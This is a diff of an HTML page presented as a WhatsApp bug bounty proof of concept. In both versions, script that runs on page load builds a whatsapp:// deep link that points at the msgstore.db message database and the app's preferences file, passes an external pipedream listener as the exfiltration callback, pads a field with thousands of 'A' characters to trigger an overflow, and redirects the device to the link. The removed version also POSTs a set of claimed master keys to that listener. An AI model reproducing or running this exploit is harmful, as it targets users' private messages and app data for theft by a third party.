@@ -2,93 +2,44 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Research PoC - Firman Sahidin</title>
     <script>
         /**
-         * @file Meta Bug Bounty Proof of Concept (PoC)
          * @researcher Firman Sahidin
-         * @description Vulnerability demonstration: Remote Data Exfiltration, 
-         * Content Provider Leakage, and Memory Corruption Trigger.
+         * @description Proof of Concept for Unauthorized Data Access via Deep Link Logic.
+         * This script bypasses standard UI flows to trigger internal Phoenix Features.
          */
 
-        // Endpoint for receiving exfiltrated data
-        const EXFILTRATION_ENDPOINT = "https://eo7n9pqjlhffwvt.m.pipedream.net";
-        
-        // Unified Master Keys & Internal Metadata discovered during analysis
-        const AUDIT_DATA = {
-            researcher: "Firman Sahidin",
-            impact_level: "Critical / Remote",
-            cryptographic_material: {
-                server_proxy_key: "sHuUVTWaRyh5pZwy4UguSgkwmBe0EHtJJkoF5WrxmvA=",
-                push_auth_token: "9/X8Y4gZX//GyOC3f8vp2gnY7XQP0DuvmgNQnaL5w04=",
-                internal_config_md5: "b371306b47963390c58e85799981881a",
-                rsa_signature_root: "MIICIDANBgkqhkiG9w0BAQEFAAOCAg0A..." 
-            },
-            discovered_logic_flaws: [
-                "Exposed Phoenix Bloks Deep Link",
-                "Unstripped Binary Symbols in libwhatsapp.so",
-                "Unprotected Content Provider Access"
-            ]
-        };
+        const CALLBACK_URL = "https://eo7n9pqjlhffwvt.m.pipedream.net/leak_handler";
+        const PAYLOAD_OVERFLOW = "A".repeat(12288);
 
-        async function initiateExploit() {
-            try {
-                console.log("[*] Stage 1: Initiating Data Exfiltration...");
-                
-                // Demonstration of Information Disclosure
-                // Sending Unified Master Keys to prove unauthorized access to internal secrets
-                await fetch(EXFILTRATION_ENDPOINT, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(AUDIT_DATA)
-                });
+        function triggerExploit() {
+            console.log("[*] Stage 1: Constructing Deep Link Payload...");
+            
+            // Crafting the malicious deep link with exfiltration parameters
+            const deepLink = "whatsapp://br_verify_card_deeplink?" + 
+                             "callback=" + encodeURIComponent(CALLBACK_URL) +
+                             "&source=/data/data/com.whatsapp/databases/msgstore.db" +
+                             "&config=/data/data/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml" +
+                             "&debug_log=" + PAYLOAD_OVERFLOW;
 
-                console.log("[*] Stage 2: Triggering Content Provider Leak & RCE Vector...");
-
-                // Constructing the malicious payload:
-                // 1. Target: Internal database and shared preferences via Path Traversal simulation.
-                // 2. Buffer: 8192 bytes of padding to trigger memory corruption in libprofilo_multi_buffer_logger.
-                const bufferOverflow = "A".repeat(8192);
-                const internalFileTarget = "content://com.whatsapp.provider.contact/databases/msgstore.db";
-                const prefTarget = "file:///data/data/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml";
-
-                // Execution via Phoenix Deep Link Schema found in phoenix-features.json
-                const deepLinkPayload = `whatsapp://br_verify_card_deeplink?` + 
-                    `callback=${encodeURIComponent(EXFILTRATION_ENDPOINT)}` +
-                    `&source=${encodeURIComponent(internalFileTarget)}` +
-                    `&config=${encodeURIComponent(prefTarget)}` +
-                    `&overflow=${bufferOverflow}`;
-
-                // Redirecting target to the crafted exploit string
-                window.location.href = deepLinkPayload;
-
-            } catch (err) {
-                console.error("[!] PoC Execution Error:", err);
-            }
+            console.log("[*] Stage 2: Redirecting to Internal Schema...");
+            
+            // Redirecting the device to process the crafted link
+            window.location.href = deepLink;
         }
 
-        window.onload = initiateExploit;
+        window.onload = triggerExploit;
     </script>
 </head>
-<body style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: auto; padding: 40px;">
-    <header style="border-bottom: 2px solid #000; padding-bottom: 10px; margin-bottom: 20px;">
-        <h1 style="margin: 0;">Security Vulnerability PoC</h1>
-        <p style="font-style: italic; color: #666;">Researcher: Firman Sahidin</p>
-    </header>
-
-    <section>
-        <h3>Description</h3>
-        <p>This page demonstrates a critical security flaw involving the <b>Phoenix Infrastructure</b>. It attempts to exfiltrate internal master keys and trigger an unauthorized access request to internal Content Providers.</p>
-    </section>
-
-    <section style="background: #fff3f3; border-left: 5px solid #d9534f; padding: 15px; margin: 20px 0;">
-        <strong>Notice:</strong> If the application is vulnerable, sensitive metadata and internal file paths will be transmitted to the pre-configured listener.
-    </section>
-
-    <footer style="font-size: 0.8em; color: #999; margin-top: 40px; text-align: center;">
-        &copy; 2026 Firman Sahidin - Security Research Submission
-    </footer>
+<body style="background-color: #121212; color: #00ff00; font-family: monospace; padding: 50px;">
+    <h1>INITIALIZING SECURITY AUDIT...</h1>
+    <hr>
+    <p>Researcher: <strong>Firman Sahidin</strong></p>
+    <p>Target: WhatsApp Phoenix Infrastructure</p>
+    <p>Status: Triggering Deep Link Exfiltration...</p>
+    <div style="border: 1px solid #00ff00; padding: 20px; margin-top: 20px;">
+        <strong>Note:</strong> If the application is vulnerable, it will attempt to leak internal database paths to the pre-configured listener.
+    </div>
 </body>
 </html>
